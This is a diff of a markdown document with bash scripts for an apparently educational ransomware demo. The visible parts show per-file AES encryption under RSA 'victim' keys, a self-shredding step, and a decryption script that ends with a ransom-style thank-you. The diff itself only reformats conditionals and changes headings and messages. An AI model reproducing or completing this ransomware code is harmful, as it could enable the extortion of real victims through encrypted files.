@@ -111,7 +111,7 @@ echo "At this point, this file shreds itself."
 shred -u -- "$0"
  ```
 
-### Version 3 
+### Version 3 (finale Version)
 ```bash
 #!/bin/bash
 
@@ -138,9 +138,18 @@ openssl rsa -pubout -in rsa_victim_key_private.key -out rsa_victim_key_public.ke
 # Step 2
 # Encrypt every file with its own AES key
 for arg in "$@"; do
-    if [ "$arg" == "$0" ]; then continue; fi
-    if [ -d "$arg" ]; then continue; fi
-    if [ ! -f "$arg" ]; then continue; fi
+    if [ "$arg" == "$0" ];
+    then
+        continue;
+    fi
+    if [ -d "$arg" ];
+    then
+        continue;
+    fi
+    if [ ! -f "$arg" ];
+    then
+        continue;
+    fi
 
     AES_FILE_KEY=$(openssl rand -hex 32)
     echo -n "$AES_FILE_KEY" > aes_file_key.tmp
@@ -209,13 +218,11 @@ do
 done
 ```
 
-### Version 2
+### Version 2 (finale Version)
 ```bash
 #!/bin/bash
 
 RSA_SIZE=256
-
-echo "Starting Decryption"
 
 # Step 1: Extract files and keys
 
@@ -251,7 +258,7 @@ do
         rm -f "$file" tmp_rsa.bin
 done
 
-echo "=== Decryption Complete ==="
+echo "Decryption Complete :)"
 echo "Original files have been restored."
 echo "Mr. Lichter thanks you for doing business with  you."
 ```
